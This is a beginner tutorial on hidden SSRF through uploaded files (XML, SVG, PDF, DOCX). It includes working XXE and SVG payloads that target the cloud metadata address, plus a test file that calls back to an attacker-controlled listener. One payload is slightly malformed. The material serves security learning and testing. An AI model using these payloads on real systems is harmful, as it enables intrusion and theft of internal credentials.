# URLs within data formats

---

## The Big Idea (ONE sentence)

> **Sometimes you hide a web address inside a file you upload, and the server unknowingly visits that address.**

That's it. That's hidden SSRF via data formats.

---

## Let me tell you a story

**Imagine you're mailing a letter to a bank.**

The bank says: *"Send us your request in a special envelope. We'll open it and read what's inside."*

Normally, you write: *"Please transfer $100 to my account."*

But what if you write something sneaky inside the envelope?  
You write: *"Oh, and by the way, could you please walk over to the back door of the bank and read the secret code written there, then tell me what it says?"*

The bank does it! Because they just follow instructions.

That's XXE/SSRF. The file format (XML) allows **hidden instructions** inside it.

---

## What are "data formats"?

When your computer talks to a website, they use a shared language. Two common languages:

| Format | Looks like | Used for |
|--------|-----------|----------|
| **XML** | `<name>John</name>` | Old but still used (banking, SOAP, config files) |
| **JSON** | `{"name":"John"}` | Modern APIs |
| **CSV** | `John,25,NY` | Spreadsheets |
| **SVG** | `<svg><image href="..."/></svg>` | Pictures |

Some of these formats **allow URLs inside them** as part of the rules.

---

## The sneaky part

When the server **parses** (reads) your file, it follows all instructions inside — including "go fetch this URL."

The programmer probably forgot that the format itself allows URLs. They only checked: *"Is this a valid XML file?"*  
They didn't check: *"Does this XML contain hidden URLs?"*

---

## Example 1: XML (the classic)

### Normal XML you might send:
```xml
<user>
  <name>Alice</name>
  <age>25</age>
</user>
```

Server reads it. Nothing happens except storing Alice, 25.

### Evil XML you send instead:
```xml
<!DOCTYPE user [
  <!ENTITY secret SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user>
  <name>&secret;</name>
  <age>25</age>
</user>
```

**What this says in plain English:**

> "Dear server, when you see `&secret;`, please go visit `http://169.254.169.254/latest/meta-data/` and put whatever you find there into the `<name>` field."

The server obediently does it.  
Now the server has visited a secret internal address (cloud metadata), and you get the response back in the `name` field.

**You never typed a URL in a form field.** You hid it inside an XML file.

---

## Example 2: SVG pictures (the innocent-looking image)

Websites let you upload profile pictures. You upload `cat.jpg` — safe.

But some websites also accept `.svg` files (scalable vector graphics).

An SVG file is actually **text** that looks like this:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

**What this says:**

> "Dear server, please fetch the image from this URL and show it."

The server thinks: *"OK, I'll go get that image so I can display it."*

But the URL points to an **internal secret address**, not a real image. The server visits it anyway.

**Result:** Hidden SSRF from an innocent-looking profile picture upload.

---

## Example 3: PDF files (even more hidden)

PDFs can contain **actions** like "when opened, go to this URL."

If the server generates a thumbnail/preview of your PDF, it might follow that URL.

You upload a PDF with a hidden action:  
`/URI (http://169.254.169.254/)`

Server generates preview → visits your URL → SSRF.

---

## Example 4: Excel/Word documents (DOCX, XLSX)

These are actually **ZIP files** containing XML inside.

You can:
1. Unzip a `.docx` file
2. Edit one of the XML files inside to add a URL
3. Re-zip it and rename back to `.docx`
4. Upload it

When the server parses your document (to convert to PDF or extract text), it might follow that URL.

---

## Why is this so hard to find?

| Normal SSRF | Hidden SSRF (via data formats) |
|-------------|--------------------------------|
| You see: `?url=https://...` in the address bar | You see: "Upload file" button |
| You think: "Let me change that URL" | You think: "This seems safe, just a file upload" |
| Easy to test | Requires crafting special files |

The attack surface is **invisible** until you understand that files themselves can contain instructions.

---

## Your new mental checklist

Whenever you see **any** of these, test for hidden SSRF:

- [ ] **File upload** that accepts XML
- [ ] **File upload** that accepts SVG
- [ ] **File upload** that accepts PDF
- [ ] **File upload** that accepts DOCX, XLSX, PPTX
- [ ] **Any place** the app says "upload your configuration file"
- [ ] **Any place** the app says "import from file"

---

## Simple testing strategy (no deep knowledge needed)

### Step 1: Create a test file
Make an XML file on your computer called `test.xml` with this content:

```xml
<!DOCTYPE test [
  <ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/SSRF-TEST">
]>
<test>&xxe;</test>
```

Replace `YOUR-SERVER.com` with a free listener from:
- **webhook.site** (free, gives you a URL)
- **Burp Collaborator** (if you use Burp Suite)
- **requestbin.com**

### Step 2: Upload the file
Upload `test.xml` wherever the app accepts XML files.

### Step 3: Check your listener
Go back to webhook.site or your listener.  
Did you see a request arrive?

If **YES** → The server visited your URL. You found SSRF!

If **NO** → Try other formats (SVG, PDF) or the app might not be vulnerable.

---

## Real-world example (simplified)

**Company:** A note-taking app that let you import notes from an XML file.

**What developers thought:** "We'll just read the title and body from the XML. Safe."

**What actually happened:** An attacker uploaded an XML file with a hidden URL pointing to `http://internal-database/admin`

**Result:** The server visited the internal admin panel and returned the secret data inside the note body. The attacker now had internal database credentials.

**All because the file format allowed URLs, and the developer forgot.**

---

## One picture in your mind

Imagine a **library** (the server).

Normally, you walk in and say: *"Please get me the book from shelf A."*

But if you're allowed to write a **letter** and give it to the librarian, and the letter says: *"Please go to the bank vault and read the secret code, then write it down for me"* — the librarian might just do it.

The file (letter) contains hidden instructions. The server (librarian) follows them.

That's hidden SSRF via data formats.

---

## Your mastery check (3 questions)

After reading this, you should be able to answer:

1. **Q:** Can a simple image upload cause SSRF?  
   **A:** Yes — if it's an SVG image (which is actually text with URLs inside)

2. **Q:** Does the server have to show you the result of the hidden request?  
   **A:** No — but you can still detect it with your own listener (webhook.site)

3. **Q:** Why is this "hidden" attack surface?  
   **A:** Because the app never asks for a URL. It asks for a file. The URL is hidden inside the file.

---

## Final simple rule

> **Any time an app accepts a file, ask yourself: "Does this file format allow URLs inside it?"**

If yes → Test for hidden SSRF.

Formats that allow URLs inside: XML, SVG, PDF, DOCX, XLSX, PPTX, some image formats (via metadata), and even some video formats.

**You don't need to be a hacker to test this. You just need to know: files can hide instructions.**